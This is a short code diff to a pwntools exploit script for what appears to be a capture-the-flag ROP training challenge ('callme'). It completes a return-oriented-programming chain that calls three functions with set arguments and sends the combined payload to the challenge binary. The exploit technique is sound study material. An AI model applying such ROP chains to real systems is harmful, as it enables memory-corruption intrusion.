@@ -21,7 +21,9 @@ callmePayload =  p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df
 # payload 1 successfully completes callme_one
 payload1 = padding + stackAligner + registerGadget + callmePayload + stackAligner + callme_oneAddr
 
-payload2 = stackAligner +
+payload2 = stackAligner + registerGadget + callmePayload + stackAligner + callme_twoAddr
 
-chall.sendafter(b"> ", payload1)
+payload3 = stackAligner + registerGadget + callmePayload + stackAligner + callme_threeAddr
+
+chall.sendafter(b"> ", payload1+payload2+payload3)
 chall.interactive() 
